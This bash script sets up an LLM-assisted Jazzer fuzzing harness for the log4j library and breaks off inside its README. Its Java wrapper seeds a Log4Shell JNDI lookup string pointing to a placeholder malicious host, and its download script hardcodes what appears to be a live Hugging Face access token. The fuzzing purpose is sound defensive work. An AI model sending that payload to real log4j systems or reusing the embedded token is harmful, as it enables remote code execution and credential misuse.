#!/bin/bash

# Create directory structure
echo "Creating directory structure..."
mkdir -p llm_fuzzer/model
mkdir -p llm_fuzzer/generated_tests
mkdir -p llm_fuzzer/scripts

# Change to the root directory
cd llm_fuzzer

# Create a Python script to download and utilize the model
cat > scripts/download_model.py << 'EOF'
import os
import subprocess
import sys
from huggingface_hub import login, hf_hub_download

def setup_model():
    print("Logging in to Hugging Face...")
    # Use the provided token for authentication
    token = "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"
    login(token=token)

    # Define the model we want to download
    model_id = "Qwen/Qwen2.5-Coder-7B-Instruct-GGUF"
    model_file = "qwen2.5-coder-7b-instruct-q4_k_m.gguf"  # Using 4-bit quantization for smaller size

    print(f"Downloading {model_file} from {model_id}...")
    try:
        # Check if model is already downloaded
        if os.path.exists(f"model/{model_file}"):
            print(f"Model already exists at model/{model_file}")
            return True

        # Download the model
        model_path = hf_hub_download(
            repo_id=model_id,
            filename=model_file,
            local_dir="model",
            local_dir_use_symlinks=False
        )

        print(f"Model downloaded successfully to {model_path}")
        return True
    except Exception as e:
        print(f"Error downloading model: {e}")
        return False

if __name__ == "__main__":
    # Install required packages if not already installed
    required_packages = ["huggingface_hub", "transformers"]
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

    # Now download the model
    setup_model()
EOF

# Create a Python script for generating test cases
cat > scripts/generate_test_cases.py << 'EOF'
import os
import json
import time
from llama_cpp import Llama

def initialize_model():
    """Initialize the model for text generation."""
    model_path = "model/qwen2.5-coder-7b-instruct-q4_k_m.gguf"

    if not os.path.exists(model_path):
        raise FileNotFoundError(f"Model file not found at {model_path}. Please run download_model.py first.")

    print(f"Loading model from {model_path}...")
    # Initialize the model with appropriate parameters
    llm = Llama(
        model_path=model_path,
        n_ctx=4096,          # Context window size
        n_batch=512,         # Batch size for prompt processing
        n_threads=4,         # Number of threads to use
        n_gpu_layers=0       # Set to higher number if you have a GPU
    )

    return llm

def generate_log4j_test_cases(llm, num_cases=5):
    """Generate test cases for log4j fuzzing."""
    prompt_template = """<|im_start|>system
You are an expert Java developer specializing in creating test cases for fuzzing the log4j library.
<|im_end|>
<|im_start|>user
Generate a Java string that would be a good test case for fuzzing log4j. This string will be used as input to the following fuzzer methods:

1. fuzzPatternLayout - Generate a pattern string that might trigger interesting behavior in log4j's PatternLayout
2. fuzzLogMessages - Generate a log message that might trigger interesting behavior
3. fuzzJsonLayout - Generate content that might cause issues in JsonLayout
4. fuzzMessagePattern - Generate a message pattern format string that might reveal bugs

Focus on creating strings that might trigger edge cases, like special characters, extremely long strings, format specifiers, JNDI lookups, or other potentially problematic inputs.

Return ONLY the test string without any explanation or code wrapping.
<|im_end|>
<|im_start|>assistant
"""

    test_cases = []

    for i in range(num_cases):
        print(f"Generating test case {i+1}/{num_cases}...")

        # Generate a test case
        completion = llm.create_completion(
            prompt=prompt_template,
            max_tokens=1024,
            temperature=0.7,
            top_p=0.9,
            repeat_penalty=1.1,
            stop=["<|im_end|>"]
        )

        # Extract the generated text
        generated_text = completion["choices"][0]["text"].strip()
        test_cases.append(generated_text)

        # Sleep briefly to avoid overwhelming the system
        time.sleep(1)

    # Save test cases to file
    output_path = "generated_tests/log4j_test_cases.json"
    with open(output_path, 'w') as f:
        json.dump(test_cases, f, indent=2)

    print(f"Generated {len(test_cases)} test cases and saved to {output_path}")
    return test_cases

if __name__ == "__main__":
    try:
        # Try to import llama_cpp, install if not available
        try:
            from llama_cpp import Llama
        except ImportError:
            import subprocess
            import sys
            print("Installing llama-cpp-python...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "llama-cpp-python"])
            from llama_cpp import Llama

        llm = initialize_model()
        generate_log4j_test_cases(llm)

    except Exception as e:
        print(f"Error generating test cases: {e}")
EOF

# Create a Python script to integrate generated tests with your log4j fuzzer
cat > scripts/integrate_tests.py << 'EOF'
import os
import json
import sys
import random
import re

def load_test_cases():
    """Load the generated test cases."""
    test_case_path = "generated_tests/log4j_test_cases.json"
    if not os.path.exists(test_case_path):
        print(f"Test cases file not found at {test_case_path}. Please run generate_test_cases.py first.")
        return None

    with open(test_case_path, 'r') as f:
        return json.load(f)

def generate_jazzer_dictionary(test_cases, output_path="generated_tests/log4j_dictionary.dict"):
    """Generate a dictionary file for Jazzer based on test cases."""
    unique_tokens = set()

    # Extract tokens from test cases
    for test_case in test_cases:
        # Add the full test case
        unique_tokens.add(test_case)

        # Add smaller parts that might be interesting
        parts = re.findall(r'[${}%][a-zA-Z0-9_]*', test_case)
        unique_tokens.update(parts)

        # Add any patterns that look like format specifiers
        format_specs = re.findall(r'%[a-zA-Z]', test_case)
        unique_tokens.update(format_specs)

    # Write to dictionary file
    with open(output_path, 'w') as f:
        for token in unique_tokens:
            if token.strip():  # Skip empty tokens
                f.write(f'"{token}"\n')

    print(f"Generated Jazzer dictionary with {len(unique_tokens)} tokens at {output_path}")
    return output_path

def create_corpus_files(test_cases, corpus_dir="generated_tests/corpus"):
    """Create corpus files for Jazzer based on test cases."""
    os.makedirs(corpus_dir, exist_ok=True)

    for i, test_case in enumerate(test_cases):
        file_path = os.path.join(corpus_dir, f"test_case_{i}.txt")
        with open(file_path, 'w') as f:
            f.write(test_case)

    print(f"Created {len(test_cases)} corpus files in {corpus_dir}")
    return corpus_dir

def generate_enhanced_fuzzer_wrapper():
    """Generate a wrapper for the log4j fuzzer that uses our generated tests."""
    wrapper_path = "../Log4jFuzzerWrapper.java"

    with open(wrapper_path, 'w') as f:
        f.write("""package org.example;

import com.code_intelligence.jazzer.api.FuzzedDataProvider;
import com.code_intelligence.jazzer.api.FuzzerSecurityIssueHigh;
import java.io.File;
import java.io.FileReader;
import java.io.BufferedReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class Log4jFuzzerWrapper {
    private static final List<String> TEST_CASES = new ArrayList<>();
    private static final Random RANDOM = new Random();

    static {
        // Load test cases from our generated files
        try {
            File corpusDir = new File("llm_fuzzer/generated_tests/corpus");
            if (corpusDir.exists() && corpusDir.isDirectory()) {
                for (File file : corpusDir.listFiles()) {
                    if (file.isFile() && file.getName().endsWith(".txt")) {
                        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                            StringBuilder content = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                content.append(line).append("\\n");
                            }
                            TEST_CASES.add(content.toString());
                        }
                    }
                }
                System.out.println("Loaded " + TEST_CASES.size() + " test cases from corpus directory");
            } else {
                System.out.println("Corpus directory not found, using default test cases");
                // Add some default test cases in case our corpus isn't available
                TEST_CASES.add("${jndi:ldap://malicious.example.com/payload}");
                TEST_CASES.add("%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n");
                TEST_CASES.add("{json:['test']}");
            }
        } catch (IOException e) {
            System.err.println("Error loading test cases: " + e.getMessage());
        }
    }

    public static void fuzzerTestOneInput(FuzzedDataProvider data) {
        try {
            // Randomly determine if we should use a predefined test case or generated data
            boolean usePredefined = data.consumeBoolean();

            if (usePredefined && !TEST_CASES.isEmpty()) {
                // Use one of our predefined test cases
                int index = data.consumeInt(0, TEST_CASES.size() - 1);
                String testCase = TEST_CASES.get(index);

                // Create a new FuzzedDataProvider with our chosen test case data
                byte[] testCaseBytes = testCase.getBytes();
                FuzzedDataProvider wrappedData = new FuzzedDataProvider(testCaseBytes);

                // Call the original fuzzer with our data
                Log4jFuzzer.fuzzerTestOneInput(wrappedData);
            } else {
                // Let Jazzer generate data normally
                Log4jFuzzer.fuzzerTestOneInput(data);
            }
        } catch (Exception e) {
            // Report high severity security issues for certain exceptions
            if (isSecurityException(e)) {
                throw new FuzzerSecurityIssueHigh("Potential security issue detected: " + e.getMessage());
            }
            // Otherwise just let the original fuzzer handle the exception
            throw e;
        }
    }

    private static boolean isSecurityException(Exception e) {
        // Check for security-relevant exceptions
        String message = e.getMessage() != null ? e.getMessage().toLowerCase() : "";
        return message.contains("jndi") ||
               message.contains("remote") ||
               message.contains("injection") ||
               message.contains("deserialization") ||
               e instanceof SecurityException;
    }
}
""")

    print(f"Generated enhanced fuzzer wrapper at {wrapper_path}")
    return wrapper_path

def print_jazzer_command(dictionary_path):
    """Print the command to run Jazzer with the enhanced wrapper and dictionary."""
    print("\nTo run Jazzer with the enhanced wrapper and generated dictionary, use this command:")
    print(f"""
JAVA_TOOL_OPTIONS="-javaagent:$HOME/.m2/repository/org/jacoco/org.jacoco.agent/0.8.10/org.jacoco.agent-0.8.10-runtime.jar=destfile=target/jacoco.exec" \\
../jazzer-cli/jazzer \\
--cp=target/classes:$(cat classpath.txt) \\
--target_class=org.example.Log4jFuzzerWrapper \\
'--instrumentation_includes=org.apache.logging.log4j.**' \\
-dict={dictionary_path} \\
-seed=12345 \\
-runs=10000
""")

if __name__ == "__main__":
    test_cases = load_test_cases()
    if test_cases:
        dictionary_path = generate_jazzer_dictionary(test_cases)
        corpus_dir = create_corpus_files(test_cases)
        wrapper_path = generate_enhanced_fuzzer_wrapper()
        print_jazzer_command(dictionary_path)
    else:
        print("No test cases found. Please run generate_test_cases.py first.")
EOF

# Create a README file with instructions
cat > README.md << 'EOF'
# LLM-Powered Log4j Fuzzer

This project uses the Qwen2.5-Coder-7B model to generate test cases for fuzzing the log4j library.

## Setup Instructions

1. Make sure you have Python 3.8+ installed

2. Install the required Python packages: